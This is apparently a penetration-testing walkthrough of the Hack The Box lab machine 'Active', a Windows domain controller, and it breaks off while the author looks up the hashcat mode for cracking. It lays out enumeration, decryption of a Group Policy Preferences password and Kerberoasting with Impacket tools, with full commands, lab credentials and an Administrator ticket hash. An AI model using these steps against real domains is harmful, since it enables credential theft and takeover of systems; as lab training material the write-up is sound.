---
Primary_category: "[[EASY]]"
title: ACTIVE
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags: 
cssclasses:
---

###### PRIMARY CATEGORY → [[EASY]]

#### Summary

- ***Summary A***
- ***Summary B***
- ***Summary C***
- ***Summary D***
- ***Summary E***

![[ACTIVE-20241116160153849.webp|450]]

---

#### Setup

Directory creation with the Machine's Name

```bash
mkdir Active && cd !$
```

Creation of a *Pentesting Folder Structure* to store all the information related to the target

> ***[[ZSH CUSTOM FUNCTIONS#mkt|Reference]]***

```bash title="Active"
mkt
```

> [!IMPORTANT]- *Tree*
>
> ```bash
> .
> ├── evidence
> │   ├── creds
> │   ├── data
> │   └── screenshots
> ├── logs
> ├── scans
> ├── scope
> └── tools
> ```
>

---

#### Recon

##### *OS Identification*

First, proceed to identify the *Target Operative System*. This can be done by a simple `ping` taking into account the *TTL Unit*

The standard values are →

- ***About 64 → Linux***
- ***About 128 → Windows***

```bash title="Active/scans"
ping -c1 10.129.135.22
```

> [!NOTE]- *Command Output*
>
> ```bash
> PING 10.129.135.22 (10.129.135.22) 56(84) bytes of data.
> 64 bytes from 10.129.135.22: icmp_seq=1 ttl=127 time=43.4 ms
> 
> --- 10.129.135.22 ping statistics ---
> 1 packets transmitted, 1 received, 0% packet loss, time 0ms
> rtt min/avg/max/mdev = 43.402/43.402/43.402/0.000 ms
> ```
>

As mentioned, according to the TTL, It seems that It is a ***Windows Target***

##### *Port Scanning*

###### *General Scan*

Let's run a *Nmap* Scan to check what *TCP* Ports are opened in the machine

The Scan result is exported in a grepable format for subsequent *Port Parsing*

```bash title="Active/scans"
nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn -oG allPorts 10.129.135.22
```

> [!NOTE]- *AllPorts Output*
>
> ```bash title="Active/scans/AllPorts"
> # Nmap 7.94SVN scan initiated Sat Nov 16 16:31:38 2024 as: nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn -oG allPorts 10.129.135.22
> # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
> Host: 10.129.135.22 () Status: Up
> Host: 10.129.135.22 () Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-
> rpc-epmap///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5722/open/tcp//msdfsr///, 9389/open/tcp//adws///, 47001/open/tcp//winrm///, 49152/open/tcp/////, 49153/open/tcp/////, 49154/open/t
> cp/////, 49155/open/tcp/////, 49157/open/tcp/////, 49158/open/tcp/////, 49162/open/tcp/////, 49166/open/tcp/////, 49168/open/tcp/////
> # Nmap done at Sat Nov 16 16:31:51 2024 -- 1 IP address (1 host up) scanned in 13.59 seconds
> ```
>

**Open Ports → 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5722, 9389, 47001, 49152, 49153, 49154, 49155, 49157, 49158, 49162, 49166 and 49168**

###### *Comprehensive Scan*

The *[[ZSH CUSTOM FUNCTIONS#extractPorts|ExtractPorts]]* utility is used to get a **Readable Summary** of the previous scan and have ***all Open Ports copied to the clipboard***

```bash title="Active/Scans"
extractPorts allPorts
```

> [!NOTES]- *ExtractPorts Output*
>
> ```bash title="Active/scans"
> [+] Extracting information...
>
>     [+] IP Address: 10.129.135.22
>     [+] Open Ports: 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49162,49166,49168
>
> [+] Ports Copied to Clipboard
> ```
>

Then, the ***Comprehensive Scan*** is performed to gather the ***Service and Version*** running on each open port and launch a set of ***Nmap Basic Recon Scripts***

Note that this scan is also exported to have evidence at hand

```bash title="Active/Scans"
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49162,49166,49168 -sCV -oN targeted 10.129.135.22
```

> [!NOTES]- *Targeted Output*
>
> ```bash title="Active/scans/Targeted"
> # Nmap 7.94SVN scan initiated Sat Nov 16 16:37:06 2024 as: nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49162,49166,49168 -sCV -oN targeted 10.129.135.22
> Nmap scan report for active.htb (10.129.135.22)
> Host is up (0.11s latency).
> 
> PORT      STATE SERVICE       VERSION
> 53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
> | dns-nsid: 
> |_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
> 88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-16 15:37:15Z)
> 135/tcp   open  msrpc         Microsoft Windows RPC
> 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
> 389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
> 445/tcp   open  microsoft-ds?
> 464/tcp   open  kpasswd5?
> 593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
> 636/tcp   open  tcpwrapped
> 3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
> 3269/tcp  open  tcpwrapped
> 5722/tcp  open  msrpc         Microsoft Windows RPC
> 9389/tcp  open  mc-nmf        .NET Message Framing
> 47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
> |_http-title: Not Found
> |_http-server-header: Microsoft-HTTPAPI/2.0
> 49152/tcp open  msrpc         Microsoft Windows RPC
> 49153/tcp open  msrpc         Microsoft Windows RPC
> 49154/tcp open  msrpc         Microsoft Windows RPC
> 49155/tcp open  msrpc         Microsoft Windows RPC
> 49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
> 49158/tcp open  msrpc         Microsoft Windows RPC
> 49162/tcp open  msrpc         Microsoft Windows RPC
> 49166/tcp open  msrpc         Microsoft Windows RPC
> 49168/tcp open  msrpc         Microsoft Windows RPC
> Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
> 
> Host script results:
> | smb2-security-mode: 
> |   2:1:0: 
> |_    Message signing enabled and required
> | smb2-time: 
> |   date: 2024-11-16T15:38:15
> |_  start_date: 2024-11-16T08:30:09
> |_clock-skew: 1s
> 
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> # Nmap done at Sat Nov 16 16:38:19 2024 -- 1 IP address (1 host up) scanned in 72.77 seconds
> ```
>

First of all, we see in the output of this comprehensive *Nmap Scan* that there is a domain name associated with the *Target IP Address*

Let's add this domain to the `/etc/hosts` file

```bash
printf "%s\t%s" "10.129.135.22" "active.htb" >> /etc/hosts
```

> [!DANGER]- */etc/hosts*
>
> ```bash
> # Host addresses
> 127.0.0.1  localhost
> 127.0.1.1  parrot
> ::1        localhost ip6-localhost ip6-loopback
> ff02::1    ip6-allnodes
> ff02::2    ip6-allrouters
> # Others
> 10.129.135.22  active.htb
> ```
>

It looks that this host is a *DC (Domain Controller)* judging by the ports It has open

As it has the *SMB* service exposed (*139 and 445 Port*), let's extract some general information about the *target*

```bash title="Active/scans"
netexec smb 10.129.135.22
```

> [!NOTE]- *Command Output*
>
> ```bash
> SMB         10.129.135.22  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
> ```
>

The *Target's hostname* is *DC*, therefore, we were right before, it is a *Domain Controller* and the *Domain Name* is ***Active.htb***

Otherwise, nothing interesting, the *SMB is signed* and *SMBv1* is not enabled

##### *53 - DNS*

Let's see if we can gather some information about the *DNS Service* running in this port

###### *Banner Grabbling*

```bash title="Active/scans"
dig version.bind CHAOS TXT @10.129.135.22 +short
```

>[!NOTE]- *Output Command*
>
> ```bash title="Active/scans"
> "Microsoft DNS 6.1.7601 (1DB15D39)"
> ```
>

The *DNS Server Version* is extracted, but we cannot do too much with that tbh since there is no *CVE* related to that version

###### *Zone Transfer*

Try to carry out a *Domain Zone Transfer* using `dig` to know some subdomains created within the *DNS Zone* related to the *active.htb* domain

```bash title="Active/scans"
dig axfr active.htb @10.129.135.22
```

> [!NOTE]- *Command Output*
>
> ```bash title="Active/scans"
> ; <<>> DiG 9.18.28-1~deb12u2-Debian <<>> axfr active.htb @10.129.135.22
> ;; global options: +cmd
> ; Transfer failed.
> ```
>

As mentioned in the above command output, the *DNS Transfer* failed, it seems that there is nothing interesting here

Let's move on to the next!

##### *135 - RPC*

We do not have any valid credentials to authenticate with a *domain user account*, but we can try to use a *Null Session (Null Authentication)*

If *Null Session* is enabled, we can extract information via *RCP* by interacting with the *EMP (Endpoint Mapper)* and *RCP Endpoints* via *namedpipes* or *dynamic ports*

Let's try to enumerate the *domain user accounts*

```bash title="Active/scans"
rpcclient --user '' --no-pass --command 'enumdomusers' active.htb
```

> [!NOTE]- *Command Output*
>
> ```bash title="Active/scans"
> do_cmd: Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
> ```
>

We cannot interact with the *SAMR Service as RCP Endpoint* due to an access denied response

Remember that the *SMB* authentication is carried out before the *RPC* client interacts with the *EMP* in the 135 port

In this case, It seems that the *SMB Authentication* was successful through the *Null Session* but we dont have enough permissions to interact with that *RCP Endpoint*

If we try to authenticate with a *Guest account*, we get in the response that the guest account is disabled

```bash title="Active/scans"
rpcclient --user 'guest%' --command 'enumdomusers' active.htb
```

> [!NOTE]- *Command Output*
>
> ```bash title="Active/scans"
> Cannot connect to server.  Error was NT_STATUS_ACCOUNT_DISABLED
> ```
>

Remember that It is not necessary to have any valid domain credentials to enumerate the *RCP* endpoints availables through the *Endpoint Mapper*

We can extract them using tools such as ***[rpcdump.py](https://github.com/fortra/impacket/blob/master/examples/rpcdump.py)*** from ***[impacket](https://github.com/fortra/impacket)***

##### *389, 636, 3268, 3269 - LDAP*

We can try an anonymous login via ldap to list any general information related to the *Active Directory Domain*

```bash title="Active/scans"
ldapsearch -x -H 'ldap://10.129.135.22' -D '' -w '' -b 'DC=active,DC=htb'
```

> [!NOTE]- *Command Output*
>
> ```bash title="Active/scans"
> # extended LDIF
> #
> # LDAPv3
> # base <DC=active,DC=htb> with scope subtree
> # filter: (objectclass=*)
> # requesting: ALL
> #
> 
> # search result
> search: 2
> result: 1 Operations error
> text: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this opera
>  tion a successful bind must be completed on the connection., data 0, v1db1
> 
> # numResponses: 1
> ```
>

Nothing here either, normally we cannot list anything related to *LDAP* until we have valid credentials to can authenticate with an existent *domain user account*

At that point, we can try to use `ldapsearch` again or switch to ***[ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)*** to get a better overview of the domain

##### *88 - Kerberos*

Since we have neither valid credentials nor existing domain user accounts, let's try to enumerate some of them via *Kerberos*

We can perform a user enumeration using `kerbrute`, simply pass as argument a valid *User Dictionary* to this tool

```bash
kerbrute userenum --dc 10.129.135.22 --domain active.htb /usr/share/seclist/Usernames/xato-net-10-million-usernames.txt
```

Note that this tool send as client a *AS_REQ* with no *Kerberos Pre-Auth* to the *KDC's AS*. If the *KDC* responds with *Principal Unknown Error*, the user does not exist

Otherwise, if the *KDC* prompts for pre-auth, then we know that the user exists in the domain

If some *domain user accounts* are found, we can carry out an *AS_REPRoast Attack* to check if that users have the flag `DONT_REQ_PREAUTH` enabled

In this case, *kerberos pre-authentication* is not necessary, so we receive as *AS_REP* a chunk of data, i.e. the *enc-part* of the *AS-REP* that we can try to crack offline

It's important to know that this chunk of data is encrypted by the *KDC* using the *NTLMv1 Hash* of the user account in question. Thefore, if we crack that ciphered object, we will get the *User Domain Account's Password*

Just let this scan in the background and continue with the enumeration

##### *139, 445 - SMB*

Earlier we have use `netexec` to perform a basic enumeration about the *Target*

Let's list the availables shared folders

Remember that we do not have credentials, therefore, we have to use a *Null Session* as before

```bash title="Active/scans"
nxc smb active.htb --username '' --password '' --shares
```

> [!NOTE]- *Command Output*
>
> ```bash title="Active/scans"
> SMB         10.129.135.22  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
> SMB         10.129.135.22  445    DC               [+] active.htb\:
> SMB         10.129.135.22  445    DC               [*] Enumerated shares
> SMB         10.129.135.22  445    DC               Share           Permissions     Remark
> SMB         10.129.135.22  445    DC               -----           -----------     ------
> SMB         10.129.135.22  445    DC               ADMIN$                          Remote Admin
> SMB         10.129.135.22  445    DC               C$                              Default share
> SMB         10.129.135.22  445    DC               IPC$                            Remote IPC
> SMB         10.129.135.22  445    DC               NETLOGON                        Logon server share
> SMB         10.129.135.22  445    DC               Replication     READ
> SMB         10.129.135.22  445    DC               SYSVOL                          Logon server share
> SMB         10.129.135.22  445    DC               Users
> ```
>

It seems that we only have read permissions on `Replication` directory

Let's try listing the same using `smbmap` to get a different perspective

```bash title="Active/scans"
smbmap -H active.htb -u '' -p ''
```

> [!NOTE]- *Command Output*
>
> ```bash title="Active/scans"
> [+] IP: active.htb:445      Name: unknown
>       Disk                                                    Permissions     Comment
>       ----                                                    -----------     -------
>       ADMIN$                                                  NO ACCESS       Remote Admin
>       C$                                                      NO ACCESS       Default share
>       IPC$                                                    NO ACCESS       Remote IPC
>       NETLOGON                                                NO ACCESS       Logon server share
>       Replication                                             READ ONLY
>       SYSVOL                                                  NO ACCESS       Logon server share
>       Users                                                   NO ACCESS
> ```
>

Yep, we can confirm that we only have read permissions on that folder

Thus, let's access to the `Replication` folder to inspect its content

```bash title="Active/evidence/data"
smbclient //active.htb/Replication --user '' --no-pass
```

I think it will be better to download all the content locally and get a better overview using a tool such as `tree`

Therefore, in the *SMB Session* stablished through `smbclient`, proceed as follows →

```bash title="Active/evidence/data"
> mask ""
> recurse on
> prompt off
> mget *
```

An `active.htb` directory had to be created in the current directory

Just examine it with tree to get a better overview as mentioned before

Remember that there are other ways to list recursively the content of a shared folder, such as the following ones →

- ***Netexec Spider Plus Module***

```bash title="Active/evidence/data"
nxc smb active.htb --username '' --password '' -M spider_plus --share Replication
```

- ***SMBMap Recursive Listing***

```bash title="Active/evidence/data"
smbmap -R -H active.htb -u '' -p ''
```

We list the following resources inside the `Replication` downloaded folder

> [!NOTE]- *Command Output*
>
> ```bash title="Active/evidence/data/active.htb"
> active.htb
> ├── DfsrPrivate
> │   ├── ConflictAndDeleted
> │   ├── Deleted
> │   └── Installing
> ├── Policies
> │   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
> │   │   ├── GPT.INI
> │   │   ├── Group Policy
> │   │   │   └── GPE.INI
> │   │   ├── MACHINE
> │   │   │   ├── Microsoft
> │   │   │   │   └── Windows NT
> │   │   │   │       └── SecEdit
> │   │   │   │           └── GptTmpl.inf
> │   │   │   ├── Preferences
> │   │   │   │   └── Groups
> │   │   │   │       └── Groups.xml
> │   │   │   └── Registry.pol
> │   │   └── USER
> │   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
> │       ├── GPT.INI
> │       ├── MACHINE
> │       │   └── Microsoft
> │       │       └── Windows NT
> │       │           └── SecEdit
> │       │               └── GptTmpl.inf
> │       └── USER
> └── scripts
> ```
>

One of them stands out above the other → `Groups.xml`

This file is generated automatically when a *GPP* related to an Addition/Update/Deletion of *Domain Computers' Local User Accounts* is configured

This can contains juicy information in old versions of *Windows Servers* →

- ***Username Field***
- ***CPassword Field***

The last one stored the *Cyphered User Password*

Since Microsoft published the *Simmetric Ciphering Key* used to encrypt that password, anyone can decrypt it, as the key is the same for all Windows Systems

```bash title="Active/evidence/data"
cat ./active.htb/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/Groups.xml
```

> [!DANGER]- *Groups.xml*
>
> ```xml
> <?xml version="1.0" encoding="utf-8"?>
> <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="
> U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></Use
> r>
> </Groups>
> ```
>

***Username → SVC_TGS***

It seems that *SVC_TGS* is a valid domain user account

We can check it using `kerbrute usernum`

```bash title="Active/evidence/data"
kerbrute userenum --dc active.htb --domain active.htb <(echo "SVC_TGS")
```

> [!NOTE]- *Command Output*
>
> ```bash title="Active/evidence/data"
>    / /_____  _____/ /_  _______  __/ /____
>   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
>  / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
> /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
>
> Version: dev (n/a) - 11/16/24 - Ronnie Flathers @ropnop
>
> 2024/11/16 18:39:10 >  Using KDC(s):
> 2024/11/16 18:39:10 >         active.htb:88
>
> 2024/11/16 18:39:10 >  [+] VALID USERNAME:    SVC_TGS@active.htb
> 2024/11/16 18:39:10 >  Done! Tested 1 usernames (1 valid) in 0.044 seconds
> ```
>

And It is! 

So we can proceed to extract its password decrypting it with the public aes key

---

#### Exploitation

##### *GPP Decrypt (Groups.xml)*

Therefore, we can extract that password, using a tool such as `gpp-decrypt`, as follows →

```bash title="Active/evidence/data"
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

Passing the *CPassword value* as argument, the password is extracted in plain text

> [!NOTE]- *Command Output*
>
> ```bash title="Active/evidence/data"
> GPPstillStandingStrong2k18
> ```
>

- ***Password → GPPstillStandingStrong2k18***

Now, let's check if this password is correct, knowing that `SVC_TGS` is an existent username

```bash title="Active/evidence/data"
nxc smb active.htb --username 'active.htb\SVC_TGS' --password 'GPPstillStandingStrong2k18'
```

> [!NOTE]- *Command Output*
>
> ```bash title="Active/evidence/data"
> SMB         10.129.135.22   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
> SMB         10.129.135.22   445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
> ```
>

***And Boom!*** The credentials are valid

So now we can authenticate as valid usernames agaisnt the *Domain Controller*

By listing again the shared folders, but this time as the *active.htb\KDC_TGS*, there are a `Users` folder that we can access

```bash
nxc smb active.htb --username 'active.htb\SVC_TGS' --password 'GPPstillStandingStrong2k18' --shares
```

> [!NOTE]- *Output Command*
>
> ```bash
> SMB         10.129.135.22   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
> SMB         10.129.135.22   445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
> SMB         10.129.135.22   445    DC               [*] Enumerated shares
> SMB         10.129.135.22   445    DC               Share           Permissions     Remark
> SMB         10.129.135.22   445    DC               -----           -----------     ------
> SMB         10.129.135.22   445    DC               ADMIN$                          Remote Admin
> SMB         10.129.135.22   445    DC               C$                              Default share
> SMB         10.129.135.22   445    DC               IPC$                            Remote IPC
> SMB         10.129.135.22   445    DC               NETLOGON        READ            Logon server share
> SMB         10.129.135.22   445    DC               Replication     READ
> SMB         10.129.135.22   445    DC               SYSVOL          READ            Logon server share
> SMB         10.129.135.22   445    DC               Users           READ
> ```
>

It seems that this directory is the same as the `Users` system directory

Therefore, we can get the content of the user.txt flag

```bash
smbclient //active.htb/Users --user 'active.htb\SVC_TGS%GPPstillStandingStrong2k18' --command 'get SVC_TGS\Desktop\user.txt'
```

Note that we cannot connect to the *Domain Controller* and get a [[SHELL SCRIPTING|shell]] or run any system command

The ports related to *WINRM* (5985, 5986) are not open, and even if they were, the *SVC_TGS* User is not part of the *Remote Management Users* group

We cannot either perform any connection via `psexec` as this user has not admin privileges to create any service

So, once the above is done, let's enumerate all the domain user accounts. Note that there are several ways to accomplish it →

###### *LDAP*

- ***LdapDomainDump***

```bash title="Active/evidence/data/ldapdomaindump"
mkdir ldapdomaindump
cd !$ && ldapdomaindump active.htb  --user 'active.htb\SVC_TGS' --password 'GPPstillStandingStrong2k18' --no-json --no-grep
```

```bash title="Active/evidence/data/ldapdomaindump"
python3 -m http.server 8888
```

Just access to the *Simple HTTP Web Server* via the browser and check all the information

###### *RPC*

We already have valid credentials, so we can communicate properly with the *SAMR RCP Endpoint* to list the *domain user accounts*

```bash title="Active/evidence/data"
rpcclient --user 'active.htb\SVC_TGS%GPPstillStandingStrong2k18' --command 'enumdomusers' active.htb
```

> [!NOTE]- *Command Output*
>
> ```bash title="Active/evidence/data"
> user:[Administrator] rid:[0x1f4]
> user:[Guest] rid:[0x1f5]
> user:[krbtgt] rid:[0x1f6]
> user:[SVC_TGS] rid:[0x44f]
> ```
>

###### *SMB*

```bash title="Active/evidence/data"
nxc smb active.htb --username 'active.htb\SVC_TGS' --password 'GPPstillStandingStrong2k18' --users
```

> [!NOTE]- *Command Output* 
>
> ```bash title="Active/evidence/data"
> SMB         10.129.135.22   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
> SMB         10.129.135.22   445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
> SMB         10.129.135.22   445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-
> SMB         10.129.135.22   445    DC               Administrator                 2018-07-18 19:06:40 0       Built-in account for administering the computer/domain
> SMB         10.129.135.22   445    DC               Guest                         <never\>             0       Built-in account for guest access to the computer/domain
> SMB         10.129.135.22   445    DC               krbtgt                        2018-07-18 18:50:36 0       Key Distribution Center Service Account
> SMB         10.129.135.22   445    DC               SVC_TGS                       2018-07-18 20:14:38 0
> ```
>

Once a list of existent usernames is obtained, we can perform, as mentioned earlier, an *AS_REPRoast Attack* to check if that *domain user accounts* dont have the *Kerberos Pre-auth* enabled

> [!INFO]-
>
> To perform an *AS_REPRoast Attack*, an attacker must have valid credentials of any *domain user account* or a list of existent domain usernames
>

The previous `kerbrute` scan dit not find nothing except the *Administrator Account*

So, let's continue!

###### *AS_REPRoast Attack*

We are gonna use this ***[impacket](https://github.com/fortra/impacket)*** example → ***GetNPUsers.py***

This can be done in two ways →

- ***Authenticating directly with a valid domain user account***

```bash title="Active/evidence/data"
GetNPUsers.py -dc-ip 10.129.135.22 active.htb/SVC_TGS:GPPstillStandingStrong2k18
```

> [!NOTE]-
>
> ```bash title="Active/evidence/data"
> Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
>
> No entries found!
> ```
>

- ***Specifying a list of existent domain user accounts***

```bash title="Active/evidence/data"
GetNPUsers.py -dc-ip 10.129.135.22 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -usersfile users.txt
```

> [!NOTE]- *Command Output*
>
> ```bash title="Active/evidence/data"
> Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
>
> [-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
> [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
> [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
> [-] User SVC_TGS doesn't have UF_DONT_REQUIRE_PREAUTH set
> ```
>

None of these users have the flag ***[DONT_REQ_PREAUTH](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties)*** enabled

Thus,  *Kerberos pre-auth* is enabled for them and we cannot receive an *AS_REP* containing an *enc-data* to try to crack it offline

##### *Kerberoasting Attack*

Remember that we already have valid credentials to be able to authenticate as the *active.htb\SVC_TGS* domain account

This means that we can request to the *KDC's AS* a *TGT* as the above user

The *Ticket Granting Ticket* allow us to perform certain actions in the domain while authenticated

One of these actions is to request a *TGS (Ticket Granting Service)* to the *KDC's TGS* for one or more *SPNs (Service Principal Names)*

Since the *TGS* is encrypted with the *NLTMv1 hash* of the *domain user account* related to the service identified by the *SPN*, we can just crack this ticket to get the plaintext password of this domain account

The tool used to carry out these actions is the following by *Impacket* → ***GetUserSPNs.py***

###### *SPN Enumeration*

First, let's list the availables *Service Principal Names* in the domain →

```bash title="Active/evidence/data"
GetUserSPNs.py -dc-ip 10.129.135.22 active.htb/SVC_TGS:GPPstillStandingStrong2k18
```

> [!NOTE]- *Command Output*
>
> ```bash title="Active/evidence/data"
> Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
>
> ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
> --------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
> active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2024-11-17 09:40:15.894933
> ```
>

Only one *SPN* is available, but one thing catch my attention

The *Domain User Account* related to that *SPN* is the *Administrator User*, which means that the *TGS* issued for this service will be encrypted with the *NTMLv1 hash* of the *administrator account* 😊

###### *TGS Capture*

So, let's request the *TGS* to the *KDC's Ticket Granting Service*

> [!INFO]-
>
> As mentioned earlier, in order to request a *TGS* for any available *SPN*, the client must have a *TGT* previousy issued by the *KDC*
>
> In this case, the *GetUserSPNs* tool takes care of this for us before we request the *TGS*
>

```bash title="Active/evidence/data"
GetUserSPNs.py -dc-ip 10.129.135.22 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -outputfile hash.kerberoast
```

A file is generated with a crackeable hash for bruteforce tools such as `hashcat` or `john`

> [!BUG]- *hash.kerberoast*
>
> ```bash
> $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$fb38a29d066b71c0f8f4c8b3b80e5396$75923575491ad7dd293ddeae6eb18a48796f3cf2f35747e1c8c594c9195ba1a15841e0c2e45f0ac7fc53d0d7b3120ee25ee75d56848b6a803c5fae156839e80e60ad9294418f10f12e9d9aff4a1dfa0c7de31ca0805c6e15d8c560bf968606b6c92feb529aff3f8022253d7290889ac0c1a408779f382733d7a751cd241bad3528b766d9ff3d3183a39da8e675c6059380ffc37619569bfee29b2e88ea490062f700a49e584dfe4d67624590259bad59364037f50b90773cf8b08998655ef3e9a854ed5cd38c88850f04577d7da3091220247c7464f0cf32109a34c97153441e28e29f7ff392cc5a24cc35f0620520ea908ceb27bca680eff8701f052717f302029df8959dc9e4b54f913b457e33174c308f33f4bd6db7f8b081c54cd4c73af655e7e4874ccd27e8a450c4eacf112ee981ea0f578b1e4912af97ac80cb99c544dbd729859a645bd4367ea67f6be6bd1a92295807545c8fd706b9d95ba2b9325df3b762bb5bd2d0c7bb76e300a89fd5d22ffefdb1458be615ae63252684f529042b99573dcc85b4fa11eca991e968a732f1f8a39cd0bf12dc23a5238eedad59894d5121ecb8c9c8234e9033fa787ff8e4802f2eb75079edae0fe259a8fca0e0e9695293577247ffc5de67bb9231fdfbad945a8bec66f7c6db3c82638adec47f1305d55648df16cb9e4178824c4767af03c043d45b8a22a35c1d1bb3eb5d1c5766169a6908affcbd0c8cd5fc2e721cc52672b3309d238255f8936827702ee94d71dccd902b63cfab85f960880bfd32ac330e619bc6810f2e7d1ed54c7ba08f45976f96738260f84c3949085483da2cb5a26002278146b9c91399324c76f923005255f634ce3c4d169f6fc87219da0e1bb8b23236188546fe0ed8deb71b2fe0dd68222af3c12c24fcaa4b6e4345bd70dab0e0ef1a361db94e1ba3e3f86030d648aa7e6b1c0273511bd325b77cba344bc5ba2e41050f199d7aa4c962fc9dfeab3c396aaba035323a52d5bd23dffa5f49ca487594a4de3f583a525d702bfc89b7e9657f9d808607969d2039f894f72bfe461774f53ff9435e347d8948450c1b140f8945a6dbcd589e6ca348974d7ea8998a28baba4249a5ddfd32d11be21ca21a6d7a1f95ddcc33fec1f80498fe7d24e5b7adda10613df39666ed7677ecdf0fc28bf39cf43571ba892e47f526e72a876f40780d40b537c79cacbe881f572ade28a690a8f6483050780489d740a69bbe06dd7cda2e7bbbfaaa73ba66ae
> ```
>

###### *TGS Cracking*

Let's crack the generated hash using both `hashcat` and `john`

- ***Hashcat***

You don't need to specify the *Hash Mode* related to the input hash to `hashcat`, as this tool detects it automatically

But, if you want to do it manually, just list the *hashcat list* with a bunch of example hashes and filter by the one used in this case, i.e. `$krb5tgs$23`

```bash title="Active/evidence/data"
hashcat --example-hashes | grep --color -iC 15 -- '$krb5tgs$23'
```

> [!NOTE]- *Command Output*
>
> ```bash title="Active/evidence/data"
> Potfile.Enabled.....: Yes
>   Custom.Plugin.......: No
>   Plaintext.Encoding..: ASCII, HEX
>
> Hash mode #13100
>   Name................: Kerberos 5, etype 23, TGS-REP
>   Category............: Network Protocol
>   Slow.Hash...........: No
>   Password.Len.Min....: 0
>   Password.Len.Max....: 256
>   Salt.Type...........: Embedded
>   Salt.Len.Min........: 0
>   Salt.Len.Max........: 256
>   Kernel.Type(s)......: pure, optimized
>   Example.Hash.Format.: plain
>   Example.Hash........: $krb5tgs$23$*user$realm$test/spn*$b548e10f5694a...24d9a [Truncated, use --mach for full length]
>   Example.Pass........: hashcat
>   Benchmark.Mask......: ?b?b?b?b?b?b?b
